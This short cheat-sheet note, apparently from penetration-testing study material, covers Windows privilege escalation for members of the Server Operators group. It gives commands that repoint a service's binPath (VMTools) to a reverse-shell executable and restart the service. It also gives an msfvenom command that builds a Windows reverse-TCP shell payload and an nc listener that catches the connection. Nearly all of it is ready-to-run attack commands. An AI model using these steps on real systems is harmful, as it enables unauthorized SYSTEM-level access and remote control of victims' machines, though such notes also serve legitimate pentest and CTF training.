<https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/>
Server Operators

If you're in this group, simple run:  services
This will show you the services you can modify and the path to it's binary. 
Simply create a revshell and replace the executable to the service.

Windows:
```
services
sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

Kali:
```
msfvenom -p windows/x64/shell/reverse_tcp lhost=tun0 lport=443 -f exe > shell.exe
nc -lvnp 443

```
